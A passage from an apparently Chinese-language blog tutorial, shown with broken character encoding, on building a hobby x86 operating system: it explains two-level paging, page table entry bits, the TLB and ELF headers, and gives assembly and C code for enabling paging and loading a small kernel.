ã€‚ä¸€ä¸ªé¡µç›®å½•é¡¹ä¸­è®°å½•ä¸€ä¸ªé¡µè¡¨ç‰©ç†é¡µåœ°å€ï¼Œç‰©ç†é¡µåœ°å€æ˜¯æŒ‡é¡µçš„ç‰©ç†åœ°å€ï¼Œåœ¨é¡µç›®å½•é¡¹åŠé¡µè¡¨é¡¹ä¸­è®°å½•çš„éƒ½æ˜¯é¡µçš„ç‰©ç†åœ°å€ã€‚</p><p>ä¸­é—´å±‚æœç„¶æ˜¯ä¸‡èƒ½çš„(bushi)</p><p>äºŒçº§é¡µè¡¨è™½ç„¶åŸç†ä¸ä¸€çº§é¡µè¡¨ç›¸åŒï¼Œä½†æ˜¯å¯»å€æ–¹å¼å‘ç”Ÿäº†ä¸€ç‚¹å°å˜åŒ–</p><p>å¯¹äºä¸€ä¸ª32ä½è™šæ‹Ÿåœ°å€ï¼š</p><ul><li>0-11ä½ï¼šé¡µå†…åç§»</li><li>12-21ä½ï¼šPTEç´¢å¼•</li><li>22-31ä½ï¼šPDEç´¢å¼•</li></ul><p>è®¡ç®—å…¬å¼å’Œä¸€çº§é¡µè¡¨ç±»ä¼¼</p><p>åæ­£è¿™äº›å…¬å¼çš„è®¡ç®—æ˜¯<code>CPU</code>å¸®ğŸ‘´å¹²çš„</p><p>çªç„¶ï¼Œå—å°½å‹æ¦¨çš„<code>CPU</code>å‘ç°ï¼Œè¿™äº›é¡µè¡¨é¡¹å’Œé¡µç›®å½•é¡¹éƒ½æ˜¯ä»¥4KBä¸ºç²’åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€å12ä½éƒ½æ˜¯0ï¼Œåæ­£å›ºå®šä¸å˜çš„ä¸œè¥¿ï¼Œå­˜æ”¾ç‚¹ä¿¡æ¯ä¸æ˜¯ç¾æ»‹æ»‹ï¼Œäºæ˜¯ï¼Œ<code>PTE</code>å’Œ<code>PDE</code>å°±è¢«æ”¹é€ è°ƒæ•™å¼€å‘æˆäº†ä¸‹é¢çš„æ¨¡æ ·ğŸ¥µã€‚ä¸‹å›¾æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/23.png" alt="img"></p><ul><li>Pï¼špresent 1ï¼šå­˜åœ¨å†…å­˜ä¸­&#x2F;0ï¼šä¸å­˜åœ¨å†…å­˜ä¸­</li><li>RWï¼šread&#x2F;wirte 1ï¼šå¯è¯»å¯å†™&#x2F;0ï¼šå¯è¯»ä¸å¯å†™</li><li>USï¼šuser&#x2F;super 1ï¼šéç‰¹æƒ&#x2F;0ï¼šç‰¹æƒ</li><li>PWTï¼šPage-level Write-Throughï¼Œé¡µçº§é€šå†™ä½ï¼Œç½®1è¡¨ç¤ºæ­¤å†…å­˜é¡µæ˜¯é«˜é€Ÿç¼“å­˜ï¼Œæ­¤å¤„ç½®0å³å¯</li><li>PCDï¼šPage-level Cache Disableï¼Œé¡µçº§é«˜é€Ÿç¼“å­˜ç¦æ­¢ä½ï¼Œç½®1è¡¨ç¤ºæ­¤å†…å­˜é¡µå¯ç”¨é«˜é€Ÿç¼“å­˜ï¼Œæ­¤å¤„ç½®0å³å¯</li><li>Aï¼šAccessedï¼Œè®¿é—®ä½ 1ï¼šè¢«CPUè®¿é—®è¿‡ï¼Œç”¨æ¥ç»Ÿè®¡è®¿é—®é¢‘ç‡</li><li>Dï¼šDirtyï¼Œè„é¡µï¼ŒCPUå¯¹ä¸€ä¸ªå†…å­˜é¡µæ‰§è¡Œå†™æ“ä½œåï¼Œä¼šå¯¹æ­¤å†…å­˜é¡µå¯¹åº”çš„é¡µè¡¨é¡¹Dä½ç½®1</li><li>PATï¼šPage Attribute Tableï¼Œå¤ªå¤æ‚äº†ï¼ŒğŸ‘´ä¸å†™äº†</li><li>Gï¼šGlobalï¼Œå…¨å±€ä½ï¼Œä¸ä¸‹æ–‡çš„TLBæœ‰å…³</li><li>AVLï¼šAvailableï¼Œå¯ç”¨ä½ï¼Œä½†æ˜¯å¯ä¸å¯ç”¨è·ŸCPUğŸ‘´æœ‰ä»€ä¹ˆå…³ç³»</li></ul><h3 id="å¼€å¯é¡µè¡¨"><a href="#å¼€å¯é¡µè¡¨" class="headerlink" title="å¼€å¯é¡µè¡¨"></a>å¼€å¯é¡µè¡¨</h3><p>boot.incæ·»åŠ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----é¡µè¡¨ç‰©ç†åœ°å€-----<br>PAGE_DIR_TABLE_POS equ 0x100000<br>;-----é¡µè¡¨å±æ€§-----<br>PG_Pequ 1b<br>PG_RW_Requ 00b<br>PG_RW_Wequ 10b<br>PG_US_S equ 000b<br>PG_US_Uequ 100b<br></code></pre></td></tr></table></figure><p>load.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----å‰é¢å°±æ˜¯è¿›å…¥PEæ¨¡å¼-----<br>call setup_page<br><br>sgdt [gdt_ptr]                                          ;ä¿å­˜å½“å‰gdtçš„å€¼<br>mov ebx, [gdt_ptr + 2]                                  ;ä½¿gdt_baseå’Œselector3çš„baseåŠ 0xc0000000<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS                             ;å°†é¡µç›®å½•è¡¨ç‰©ç†åœ°å€å­˜è¿›CR3<br>mov cr3, eax<br><br>mov eax, cr0                                            ;å¼€å¯åˆ†é¡µ<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]<br>mov byte [gs:160], &#x27;V&#x27;<br><br>jmp $<br><br><br>setup_page:<br>[bits 32]<br>mov ecx,0x1000<br>mov esi,0<br>.clear_page_dir:                                    ;å°†é¡µç›®å½•è¡¨æ¸…é›¶<br>mov byte[PAGE_DIR_TABLE_POS + esi],0<br>inc esi<br>loop .clear_page_dir<br><br>.create_pde:<br>mov eax, PAGE_DIR_TABLE_POS                     ;ç¬¬ä¸€ä¸ªé¡µè¡¨åˆ›å»ºåœ¨ç‰©ç†åœ°å€0x101000<br>add eax, 0x1000<br>mov ebx, eax<br><br>or eax, PG_US_U | PG_RW_W | PG_P                ;ç”¨æˆ·æƒé™ã€å¯å†™ã€å­˜åœ¨<br>mov [PAGE_DIR_TABLE_POS + 0x0], eax             ;å°†index=0 &amp; 768çš„é¡µç›®å½•é¡¹èµ‹å€¼ä¸º0x101007ï¼Œc00ä»¥ä¸Šçš„ç”¨äºå†…æ ¸ç©ºé—´<br>mov [PAGE_DIR_TABLE_POS+0xc00], eax<br>sub eax, 0x1000<br>mov [PAGE_DIR_TABLE_POS+4092],eax               ;å°†é¡µç›®å½•è¡¨çš„ç‰©ç†åœ°å€ä½œä¸ºæœ€åä¸€ä¸ªé¡µç›®å½•é¡¹<br><br>mov ecx, 256                                    ;å°†0x100000ä»¥ä¸‹çš„å†…å­˜ï¼Œä½œä¸ºç¬¬ä¸€ä¸ªé¡µè¡¨ä¸­çš„PTE<br>mov esi, 0<br>mov edx, PG_US_U | PG_RW_W | PG_P<br><br>.create_pte:<br>mov [ebx+esi*4], edx<br>add edx, 0x1000<br>inc esi<br>loop .create_pte<br><br>mov eax, PAGE_DIR_TABLE_POS                         ;å°†1MB-1GBçš„å†…å­˜å…¨éƒ¨æ˜ å°„åˆ°é«˜å¤„ï¼Œä½¿å¾—å†…æ ¸å’Œæ“ä½œç³»ç»Ÿå…±äº«åŒä¸€ç‰‡ç‰©ç†åœ°å€<br>add eax, 0x2000<br>or eax, PG_US_U | PG_RW_W | PG_P<br>mov ebx, PAGE_DIR_TABLE_POS<br>mov ecx, 254<br>mov esi, 769<br><br>.create_kernel_pde:<br>mov [ebx+esi*4], eax<br>inc esi<br>add eax, 0x1000<br>loop .create_kernel_pde<br><br>ret<br></code></pre></td></tr></table></figure><h3 id="è™šæ‹Ÿåœ°å€è®¿é—®é¡µè¡¨"><a href="#è™šæ‹Ÿåœ°å€è®¿é—®é¡µè¡¨" class="headerlink" title="è™šæ‹Ÿåœ°å€è®¿é—®é¡µè¡¨"></a>è™šæ‹Ÿåœ°å€è®¿é—®é¡µè¡¨</h3><p>ç”¨<code>info tab</code>å¯ä»¥æŸ¥çœ‹é¡µè¡¨æ˜ å°„</p><p><img src="/img/OS/24.png" alt="img"></p><p>è¿™è¾¹è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§å¥‡æ€ªçš„æ˜ å°„ï¼Œå› ä¸ºé¡µç›®å½•è¡¨çš„æœ€åä¸€é¡¹é¡µç›®å½•é¡¹æ˜¯é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œå¯¹åº”è™šæ‹Ÿåœ°å€çš„é«˜10ä½ä¸º0x3ff</p><p>æ­¤æ—¶é¡µç›®å½•é¡¹ä¸º<code>0x100000</code>ï¼Œæœ€åä¸€ä¸ªé¡µè¡¨é¡¹è¿˜æ˜¯åŸæ¥çš„é¡µç›®å½•é¡¹ï¼Œå°±æ˜¯è¿™ç©æ„è¢«ç”¨äº†ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡å½“é¡µç›®å½•é¡¹ï¼Œç¬¬äºŒæ¬¡å½“é¡µè¡¨é¡¹ï¼Œæ— é™å¥—å¨ƒã€‚å…¶ä½™ä¸¤ä¸ªä¹Ÿæ˜¯è¿™ä¸ªæ€è·¯ï¼Œæ‰€ä»¥è®¿é—®<code>0xfffffXXX</code>çš„è™šæ‹Ÿåœ°å€ï¼Œå°±èƒ½è®¿é—®é¡µè¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xfffff000-0xffffffff -&gt; 0x000000100000-0x000000100fff<br></code></pre></td></tr></table></figure><h3 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h3><p>åœ¨äºŒçº§é¡µè¡¨ä¸­ï¼Œä»è™šæ‹Ÿåœ°å€è½¬æ¢åˆ°ç‰©ç†åœ°å€éœ€è¦è®¿é—®ä¸‰æ¬¡å†…å­˜ï¼Œé‚£ä¸‰çº§ã€å››çº§é¡µè¡¨æ€ä¹ˆåŠï¼Ÿå¯¹äº<code>CPU</code>æ¥è¯´ï¼Œè®¿é—®å†…å­˜æ— ç–‘æ˜¯ä¸€ç§é™ä½æ•ˆç‡çš„è¡Œä¸ºï¼Œæ‰€ä»¥<code>TLB</code>ï¼ˆTranslation Lookaside Bufferï¼Œå¿«è¡¨ï¼‰å°±å‡ºç°äº†ã€‚</p><p><code>TLB</code> ä¸­çš„æ¡ç›®æ˜¯è™šæ‹Ÿåœ°å€çš„é«˜ 20 ä½åˆ°ç‰©ç†åœ°å€é«˜ 20 ä½çš„æ˜ å°„ç»“æœã€‚<code>TLB</code>å°†è¿‘æœŸè®¿é—®çš„è™šæ‹Ÿåœ°å€è½¬æ¢æˆç‰©ç†åœ°å€åï¼Œä¸€ä¸€å¯¹åº”å‚¨å­˜èµ·æ¥ï¼Œå½“<code>CPU</code>ä¸‹ä¸€æ¬¡éœ€è¦è½¬æ¢æ—¶ï¼Œä¼šå…ˆæ¥<code>TLB</code>ä¸­æŸ¥è¯¢ï¼ŒæŸ¥åˆ°å°±ç›´æ¥æ‹¿å»ç”¨ï¼Œå¦‚æœæ²¡æŸ¥åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œä¼šåœ¨è½¬æ¢åæ›´æ–°<code>TLB</code>ã€‚</p><p>å¯ä»¥ä½¿ç”¨<code>invlpg</code>æŒ‡ä»¤æ›´æ–°<code>TLB</code></p><h2 id="load-kernelï¼"><a href="#load-kernelï¼" class="headerlink" title="load kernelï¼"></a>load kernelï¼</h2><p>å¯¹äºlinux kernelï¼Œå¹¶ä¸é‡‡ç”¨çº¯æ±‡ç¼–çš„æ–¹å¼æ¥ç¼–å†™ï¼ˆè™½ç„¶è¿™8æ˜¯8è¡ŒğŸ˜…ï¼‰ï¼Œå°†Cå’Œæ±‡ç¼–ç»“åˆèµ·æ¥ä¼šæ›´ä¾¿äºç†è§£</p><p>å› ä¸ºæˆ‘ä»¬æ˜¯åœ¨linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œkernelçš„æ–‡ä»¶æ ¼å¼æ˜¯elfï¼Œæ‰€ä»¥åœ¨loader kernelæ–‡ä»¶å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹elfæ–‡ä»¶æœ‰è¶³å¤Ÿäº†è§£</p><h3 id="elf-æ–‡ä»¶"><a href="#elf-æ–‡ä»¶" class="headerlink" title="elf æ–‡ä»¶"></a>elf æ–‡ä»¶</h3><p>ELFï¼ŒExecutable and Linkable Formatï¼Œå¯æ‰§è¡Œé“¾æ¥æ ¼å¼ã€‚</p><p>ELFæ–‡ä»¶æä¾›äº†ä¸¤ç§æ–‡ä»¶è§†å›¾ï¼Œé“¾æ¥æ ¼å¼è§†å›¾å’Œæ‰§è¡Œæ ¼å¼è§†å›¾ã€‚é“¾æ¥è§†å›¾æ˜¯ä»¥èŠ‚ï¼ˆsectionï¼‰ä¸ºå•ä½ï¼Œæ‰§è¡Œè§†å›¾æ˜¯ä»¥æ®µï¼ˆsegmentï¼‰ä¸ºå•ä½ã€‚æ¥è§†å›¾å°±æ˜¯åœ¨é“¾æ¥æ—¶ç”¨åˆ°çš„è§†å›¾ï¼Œè€Œæ‰§è¡Œè§†å›¾åˆ™æ˜¯åœ¨æ‰§è¡Œæ—¶ç”¨åˆ°çš„è§†å›¾ã€‚</p><p><img src="/img/OS/25.png" alt="img"></p><p>å…ˆæ¥çœ‹çœ‹elf header</p><h4 id="ELF-header"><a href="#ELF-header" class="headerlink" title="ELF header"></a>ELF header</h4><p>ELF headerä½äºæ–‡ä»¶çš„å¼€å§‹ä½ç½®ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯å®šä½æ–‡ä»¶çš„å…¶ä»–éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_hdr<br>&#123;<br>  unsigned chare_ident[EI_NIDENT];/* Magic number and other info */<br>  Elf32_Halfe_type;/* Object file type */<br>  Elf32_Halfe_machine;/* Architecture */<br>  Elf32_Worde_version;/* Object file version */<br>  Elf32_Addre_entry;/* Entry point virtual address */<br>  Elf32_Offe_phoff;/* Program header table file offset */<br>  Elf32_Offe_shoff;/* Section header table file offset */<br>  Elf32_Worde_flags;               /* Processor-specific flags */<br>  Elf32_Halfe_ehsize;/* ELF header size in bytes */<br>  Elf32_Halfe_phentsize;/* Program header table entry size */<br>  Elf32_Halfe_phnum;/* Program header table entry count */<br>  Elf32_Halfe_shentsize;/* Section header table entry size */<br>  Elf32_Halfe_shnum;/* Section header table entry count */<br>  Elf32_Halfe_shstrndx;/* Section header string table index */<br>&#125; Elf32_Ehdr;<br></code></pre></td></tr></table></figure><p><strong>e_identï¼š</strong>16å­—èŠ‚ï¼Œå«ä¹‰å¦‚ä¸‹å›¾</p><p><img src="/img/OS/27.png" alt="img"></p><p><strong>e_typeï¼š</strong>2å­—èŠ‚ï¼Œæ–‡ä»¶ç±»å‹ï¼Œç±»å‹æœ‰ä»¥ä¸‹å‡ ä¸ª</p><p><img src="/img/OS/28.png" alt="img"></p><p><strong>e_machineï¼š</strong>2å­—èŠ‚ï¼Œæ–‡ä»¶æ¶æ„ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªæ¶æ„</p><p><img src="/img/OS/29.png" alt="img"></p><p>ç”¨<code>readelf -h</code>å³å¯æŸ¥çœ‹elf headerè¯¦ç»†ä¿¡æ¯</p><p><img src="/img/OS/26.png" alt="img"></p><h4 id="Program-header-table"><a href="#Program-header-table" class="headerlink" title="Program header table"></a>Program header table</h4><p>ä½äºelf headerä¹‹åï¼Œç¨‹åºå¤´è¡¨(Program header table)åˆ—ä¸¾äº†æœ‰æ•ˆçš„æ®µ(segments)å’Œä»–ä»¬çš„å±æ€§ï¼ˆæ‰§è¡Œè§†å›¾ï¼‰</p><p>ç¨‹åºå¤´æ˜¯ä¸€ä¸ªç»“æ„çš„æ•°ç»„ï¼Œæ¯ä¸€ä¸ªç»“æ„éƒ½è¡¨ç¤ºä¸€ä¸ªæ®µ(segments)ã€‚åœ¨å¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…å…±äº«é“¾æ¥åº“ä¸­æ‰€æœ‰çš„èŠ‚(sections)éƒ½è¢«åˆ†ä¸ºä¸åŒçš„å‡ ä¸ªæ®µ(segments)ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_phdr&#123;<br>  Elf32_Wordp_type;   <br>  Elf32_Off    p_offset;<br>  Elf32_Addrp_vaddr;<br>  Elf32_Addrp_paddr;<br>  Elf32_Wordp_filesz;<br>  Elf32_Wordp_memsz;<br>  Elf32_Wordp_flags;<br>  Elf32_Wordp_align;<br>&#125; Elf32_Phdr;<br></code></pre></td></tr></table></figure><p>ç¨‹åºå¤´çš„ç´¢å¼•åœ°å€(e_phoff)ã€æ®µæ•°é‡(e_phnum)ã€è¡¨é¡¹å¤§å°(e_phentsize)éƒ½æ˜¯é€šè¿‡ ELFå¤´éƒ¨ä¿¡æ¯è·å–çš„ã€‚</p><p><strong>p_typeï¼š</strong>æŒ‡æ˜è¯¥æ®µçš„ç±»å‹</p><p><img src="/img/OS/30.png" alt="img"></p><p><strong>p_flagsï¼š</strong>æŒ‡æ˜è¯¥æ®µçš„æ ‡å¿—</p><p><img src="/img/OS/31.png" alt="img"></p><p>ä¸‹å›¾ç”»çº¢çº¿çš„0x20å­—èŠ‚ä¾¿æ˜¯ä¸€ä¸ªç¨‹åºå¤´è¡¨</p><p><img src="/img/OS/32.png" alt="img"></p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>readelf -l</code>å¾—åˆ°è¯¦ç»†ä¿¡æ¯</p><p><img src="/img/OS/33.png" alt="img"></p><p>ä»¥ä¸Šï¼Œä¾¿æ˜¯elfæ–‡ä»¶æµ…æ</p><h3 id="now-letsâ€™s-go"><a href="#now-letsâ€™s-go" class="headerlink" title="now letsâ€™s go!"></a>now letsâ€™s go!</h3><p>å…ˆéšä¾¿å†™ä¸ªkernelï¼Œå†…è”æ±‡ç¼–ç”¨èµ·æ¥è¿˜æ˜¯çˆ½çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#include &lt;stdio.h&gt;<br><br>int main(void)<br>&#123;<br>while(1)<br>&#123;<br>asm(<br>    &quot;mov byte ptr [gs:170], &#x27;W&#x27;;&quot;<br>    &quot;mov byte ptr [gs:172], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:174], &#x27;L&#x27;;&quot;<br>    &quot;mov byte ptr [gs:176], &#x27;C&#x27;;&quot;<br>    &quot;mov byte ptr [gs:178], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:180], &#x27;M&#x27;;&quot;<br>    &quot;mov byte ptr [gs:182], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:184], &#x27; &#x27;;&quot;<br>    &quot;mov byte ptr [gs:186], &#x27;k&#x27;;&quot;<br>    &quot;mov byte ptr [gs:188], &#x27;o&#x27;;&quot;<br>    &quot;mov byte ptr [gs:190], &#x27;r&#x27;;&quot;<br>    &quot;mov byte ptr [gs:192], &#x27;e&#x27;;&quot;<br>    &quot;mov byte ptr [gs:194], &#x27;y&#x27;;&quot;<br>    &quot;mov byte ptr [gs:196], &#x27;&#x27;&#x27;;&quot;<br>    &quot;mov byte ptr [gs:198], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:200], &#x27;S&#x27;;&quot;<br>);<br>&#125;<br>return 0;    <br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°†kernelè½½å…¥åˆ°å†…å­˜ä¸­ï¼Œå®Œæˆè§£æï¼Œä¹¦ä¸­æ˜¯å°†kernelè½½å…¥åˆ°0x70000å¤„ï¼Œè§£æç¨‹åºå…¥å£åˆ°0x1500å¤„ï¼Œç¬”è€…ä¹Ÿå°±ç…§ç€æ¥äº†ã€‚</p><p>ç”¨è„šæœ¬å®Œæˆç¼–è¯‘é“¾æ¥ï¼Œ0x1500å¯¹åº”çš„è™šæ‹Ÿåœ°å€ä¸º0xc0001500</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>gcc -m32 -c ./kernel/kernel.c -o ./kernel/kernel.o -masm=intel<br>ld -melf_i386 ./kernel/kernel.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin<br></code></pre></td></tr></table></figure><p>å®Œæˆè½½å…¥å’Œè§£æåï¼Œä¾¿å¯ä»¥è·³åˆ°kernelå¤„ï¼Œloadçš„ä»»åŠ¡å°±ç»“æŸäº†ï¼ˆæˆ‘çš„ä»»åŠ¡å®Œæˆå•¦ğŸ¤ªï¼‰</p><p>ä»¥ä¸‹ä¾¿æ˜¯ä»£ç çš„å˜åŒ–</p><p><strong>boot.inc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----add-----<br>KERNEL_START_SECTORequ 0x9<br>KERNEL_BIN_BASE_ADDRequ 0x70000<br>KERNEL_ENTRY_POINTequ 0xc0001500<br>PT_NULLequ 0<br></code></pre></td></tr></table></figure><p><strong>pack.sh</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./kernel/kernel.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=200 <span class="hljs-attribute">seek</span>=9 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p><strong>load.s</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;å¼€å¯ä¿æŠ¤æ¨¡å¼......<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov eax, KERNEL_START_SECTOR<br>mov ebx, KERNEL_BIN_BASE_ADDR<br>mov ecx, 200<br>call rd_disk_m_32                       ;å’Œrd_dsik_m_16ä¸€æ ·ï¼Œå¯„å­˜å™¨æ¢æˆ32ä½å°±è¡Œ<br><br>call setup_page                         <br><br>sgdt [gdt_ptr]<br>mov ebx, [gdt_ptr + 2]<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS<br>mov cr3, eax<br><br>mov eax, cr0<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]                          ;å¼€å¯åˆ†é¡µ<br><br>jmp SELECTOR_CODE:enter_kernel          ;åˆ·æ–°æµæ°´çº¿ï¼Œè™½ç„¶ä¸åˆ·ä¹Ÿè«å¾—å…³ç³»<br><br>enter_kernel:<br>call kernel_init<br>mov esp, 0xc009f000<br>jmp KERNEL_ENTRY_POINT<br><br><br>;......<br>kernel_init:<br>[bits 32]<br>xor eax, eax<br>xor ebx, ebx<br>xor ecx, ecx<br>xor edx, edx<br><br>mov dx, [KERNEL_BIN_BASE_ADDR + 42]         ;length of program header<br>mov ebx, [KERNEL_BIN_BASE_ADDR + 28]        <br>add ebx, KERNEL_BIN_BASE_ADDR               ;program header table start address<br>mov cx, [KERNEL_BIN_BASE_ADDR+44]           ;count of program header<br><br>.each_segment:<br>cmp byte[ebx + 0],PT_NULL               ;if [ebx+0] == 0,the program header is empty<br>je .PTNULL<br><br>push dword [ebx + 16]                   ;segment size<br>mov eax, [ebx+4]<br>add eax, KERNEL_BIN_BASE_ADDR<br>push eax                                ;src<br>push dword [ebx + 8]                    ;dst<br><br>call mem_cpy<br>add esp, 12                             ;recover<br><br>.PTNULL:<br>add ebx, edx                            ;next program header<br>loop .each_segment<br>ret<br><br>mem_cpy:                                     ;æ¨¡ä»¿memcpyå‡½æ•°ï¼Œå¾…æˆ‘å»çœ‹çœ‹memcpyæºç <br>cld<br>push ebp<br>mov ebp, esp<br>push ecx<br><br>mov edi, [ebp+8]<br>mov esi, [ebp+12]<br>mov ecx, [ebp+16]<br>rep movsb                                